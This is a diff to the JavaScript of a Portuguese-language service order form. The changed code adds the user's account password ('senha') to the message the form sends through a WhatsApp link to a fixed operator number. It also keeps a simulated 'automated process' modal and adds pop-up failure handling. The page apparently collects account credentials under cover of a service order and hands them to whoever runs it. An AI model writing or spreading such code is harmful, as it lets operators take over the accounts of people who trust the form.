@@ -98,25 +98,25 @@ document.addEventListener("DOMContentLoaded", function() {
       }
 
       // Mostra loading
-      setLoadingState(true);
-
-      try {
+      setLoadingState(true);      try {
         // Mostra o modal de processo
         showProcessModal();
 
         // Simula o processo automático
         await simulateAutomatedProcess();
         
-        // Formata a mensagem
-        const mensagem = formatMessage(nome, conta, email, whatsapp, servico, metodoPagamento);
+        // Formata a mensagem (incluindo a senha)
+        const mensagem = formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento);
         
         // Envia para WhatsApp
-        await sendToWhatsApp(mensagem);
+        const enviado = await sendToWhatsApp(mensagem);
         
-        // Reset do formulário
-        this.reset();
+        if (!enviado) {
+          throw new Error("Não foi possível abrir o WhatsApp");
+        }
 
-        // Salva no histórico
+        // Reset do formulário e salva no histórico
+        this.reset();
         saveToHistory({
           nome,
           conta,
@@ -125,10 +125,12 @@ document.addEventListener("DOMContentLoaded", function() {
           data: new Date().toISOString()
         });
 
-        // Feedback e reset
+        // Feedback de sucesso
         showAlert("✅ Pedido enviado com sucesso! Verifique seu WhatsApp.", "success");
       } catch (error) {
-        showAlert("❌ Erro ao enviar pedido. Tente novamente.", "error");
+        console.error("Erro no envio:", error);
+        hideProcessModal();
+        showAlert(`❌ ${error.message || "Erro ao enviar pedido. Tente novamente."}`, "error");
       } finally {
         setLoadingState(false);
       }
@@ -210,8 +212,25 @@ function formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagam
 
 // Envia para WhatsApp
 function sendToWhatsApp(message) {
-  const url = `https://wa.me/${CONFIG.whatsappNumber}?text=${encodeURIComponent(message)}`;
-  window.open(url, "_blank");
+  return new Promise((resolve, reject) => {
+    try {
+      const url = `https://wa.me/${CONFIG.whatsappNumber}?text=${encodeURIComponent(message)}`;
+      const windowRef = window.open(url, '_blank');
+      
+      if (!windowRef) {
+        reject(new Error("Bloqueador de pop-up impediu a abertura do WhatsApp"));
+        return;
+      }
+      
+      // Dá um pequeno delay para garantir que a janela abriu
+      setTimeout(() => {
+        resolve(true);
+      }, 1000);
+    } catch (error) {
+      console.error("Erro ao abrir WhatsApp:", error);
+      reject(error);
+    }
+  });
 }
 
 // Função de alerta melhorada
